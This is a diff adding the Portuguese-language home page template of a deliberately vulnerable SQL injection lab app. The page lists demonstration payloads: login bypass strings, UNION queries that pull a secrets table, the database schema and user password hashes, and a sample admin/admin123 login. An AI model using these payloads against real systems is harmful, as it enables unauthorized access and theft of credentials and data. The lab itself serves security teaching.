@@ -1,0 +1,82 @@
+{% extends "base.html" %}
+{% block title %}Início — App Vulnerável{% endblock %}
+{% block content %}
+
+<div class="page-header">
+  <h1>App Vulnerável a SQL Injection</h1>
+  <p>Ambiente de laboratório. Use os payloads abaixo para demonstrar os ataques.</p>
+</div>
+
+<!-- Login bypass -->
+<div class="card">
+  <div class="card-head">
+    <h2 style="margin:0">Login bypass — /login</h2>
+    <span style="font-size:12px;color:var(--gray-400);font-family:var(--mono)">Authentication bypass</span>
+  </div>
+  <div class="card-body">
+    <table>
+      <thead><tr><th>Username</th><th>Password</th><th>O que acontece</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><code>' OR '1'='1' --</code></td>
+          <td><code>qualquer</code></td>
+          <td style="color:var(--red)">Login sem credenciais válidas</td>
+        </tr>
+        <tr>
+          <td><code>admin' --</code></td>
+          <td><code>qualquer</code></td>
+          <td style="color:var(--red)">Login directo como admin</td>
+        </tr>
+        <tr>
+          <td><code>' OR 1=1 --</code></td>
+          <td><code>x</code></td>
+          <td style="color:var(--red)">Condição sempre verdadeira</td>
+        </tr>
+        <tr>
+          <td><code>admin</code></td>
+          <td><code>admin123</code></td>
+          <td style="color:var(--green)">Login legítimo (para comparar)</td>
+        </tr>
+      </tbody>
+    </table>
+    <div style="margin-top:16px">
+      <a href="/login" class="btn btn-red">Ir para o login →</a>
+    </div>
+  </div>
+</div>
+
+<!-- UNION attack -->
+<div class="card">
+  <div class="card-head">
+    <h2 style="margin:0">Extracção de dados — /search</h2>
+    <span style="font-size:12px;color:var(--gray-400);font-family:var(--mono)">UNION-based injection</span>
+  </div>
+  <div class="card-body">
+    <table>
+      <thead><tr><th>Payload (campo de pesquisa)</th><th>Dados extraídos</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><code>' UNION SELECT id,name,value FROM secrets --</code></td>
+          <td style="color:var(--red)">Tabela <em>secrets</em> — passwords e API keys</td>
+        </tr>
+        <tr>
+          <td><code>' UNION SELECT 1,name,sql FROM sqlite_master --</code></td>
+          <td style="color:var(--red)">Schema completo da base de dados</td>
+        </tr>
+        <tr>
+          <td><code>' UNION SELECT 1,username,password FROM users --</code></td>
+          <td style="color:var(--red)">Todos os utilizadores e hashes</td>
+        </tr>
+        <tr>
+          <td><code>'</code></td>
+          <td style="color:var(--orange)">Erro SQL exposto (information disclosure)</td>
+        </tr>
+      </tbody>
+    </table>
+    <div style="margin-top:16px">
+      <a href="/search" class="btn btn-red">Ir para a pesquisa →</a>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
